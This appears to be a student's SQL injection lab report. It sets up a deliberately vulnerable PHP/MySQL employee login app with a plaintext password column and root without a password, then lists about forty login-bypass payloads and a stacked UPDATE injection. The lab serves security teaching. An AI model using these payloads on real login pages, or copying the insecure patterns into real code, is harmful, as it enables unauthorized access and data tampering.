You must have following programs/packages in order to run this project.
Apache: 2.4.46 and above
PHP: 7.2.33 and above
MariaDB: 10.4.14 and above
phpMyAdmin: 5.0.2 and above

Note: the XAMPP server include all above mentioned technologies. 
https://www.apachefriends.org/download.html.

Simple Employee Login Development Approach
A simple php and MySQL based web application is developed which has 
registration, login, dashboard and logout. The authentication is very common in 
modern web application. 
It is a security mechanism that is used to restrict unauthorized access to memberonly areas and tools on a site.


Step 1: Creating the database table
CREATE TABLE `users` (
 `id` int(6) unsigned NOT NULL,
 `name` varchar(50) NOT NULL,
 `username` varchar(30) NOT NULL,
 `password` varchar(30) DEFAULT NULL,
 `salary` int(9) DEFAULT NULL,
 `age` int(3) DEFAULT NULL,
 `phone` varchar(15) DEFAULT NULL, 
 PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;


Step 2: Creating the connect.inc.php script
After creating the table, we need create a PHP script in order to connect to the 
MySQL database server.
Let's create a file named " connect.inc.php " and put the following code inside it.
<?php
$mysql_host='localhost';
$mysql_user='root';
$mysql_pass='';
$mysql_db='sql_injection';
$con=mysqli_connect($mysql_host,$mysql_user,$mysql_pass,$mysql_db);
if(! $con )
{
die('<h3>* Could not connect to database right now.Please try again 
later.</h3>');
}
?>

Note: Replace the credentials according to your MySQL server setting before testing 
this code, for example, replace the database name 'sql_injection' with your own 
database name, replace username 'root' with your own database username, specify 
database password if there's any.


Step 3: Creating the registration module
Let's create another PHP file "register.php" and put the following example code in 
it. This example code will create a web form that allows user to register themselves.
This script will also generate errors if a user tries to submit the form without entering 
any value, or if username entered by the user is already taken by another user.

Step 5: Creating the welcome or home module
Here's the code of our "welcome.php" file, where user is redirected after successful 
login. 

Step 6: Creating the logout script
Now, let's create a "logout.php" file. When the user clicks on the log out or sign out 
$con, the script inside this file destroys the session and redirect the user back to the 
login page.
<?php
/* Initialize the session */
session_start();
/* Unset all of the session variables */
$_SESSION = array();
/* Destroy the session */
session_destroy();
/* Redirect to login page */

header("location: login.php");
exit;
?>
Employees can view and update their personal information in the database through 
this web application. 
There are mainly two roles in this web application: 
Administrator is a privilege role and can manage each individual employees’ profile 
information;
Employee is a normal role and can view or update his/her own profile information. 
All employee information is described in the following table.
The login page asks users to provide a user name and a password. The web 
application authenticate users based on these two pieces of data, so only employees 
who know their passwords are allowed to log in.
For these task we did a login session for Admin and other users where the 
Administrator update and deletes all the user details of the simple Employee 
management system.

Task 1
Your first task is to log into the web application as the administrator from the login 
page using SQL injection, so you can see the information of all the employees. We 
assume that you know the administrator’s account name which is admin, but you 
do not the password.
You need to decide what to type in the Username and Password fields to succeed 
in the attack.

Solution for Task1
Sql Injection Execution Approach
SQL injections are one of the most common vulnerabilities found in web applications nowadays. 
I will explain what a SQL injection attack is and take a look at an example of a 
simple vulnerable PHP web application accessing a MySQL database. After that, 
we will look at several methods to prevent this attack, fixing the problem.
As we have already set up our php simple web application now we will try to 
attach on the developed web application.
sually username and password is required to access dashboard (welcome.php) but 
we will enter following code in username text field and any password you can 
enter which will not validated while login.

I use the username which is I know it, and a password that are sql injection 
mechanism because of I didn’t know it. In the above figure the username Admin 
and password is the injecting code 'or'1'='1 and logged in to the simple employee 
management system and also we use Admin’# and any text what you want to inter 
into the password field to logged in to these system.
All the users that are registered into these simple Employee management system 
are injecting these sql injection on username’# and any text password or username 
and 'or'1'='1, and all the injected code like
‘or’1’=’1--
‘or’1’=’1#
‘or’1’=’1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*


Task 2
Append a new SQL statement and modify the database using the same 
vulnerability in the login page. 
Use the SQL injection attack to turn one SQL statement into two, with the second 
one being the update or delete statement. In SQL, semicolon (;) is used to separate 
two SQL statements. Describe how you can use the login page to get the server run 
two SQL statements.
Try the attack to delete a record from the database, and describe your observation.
You need to submit a detailed lab report, with screenshots, to describe what you 
have done and what you have observed. 
And also list the code followed by explanation. Simply attaching code without any 
explanation will not receive points.


Solution for Task2
In task 2, we have to be update, delete using two sql statements separating by 
semicolons are the following.
Updating the database by using login sql injection of two statements 
separating by semicolon which means by using these query:-
';UPDATE users SET name='Libassie Nigus' WHERE ID=75# on the 
username and you write any password as you want. 


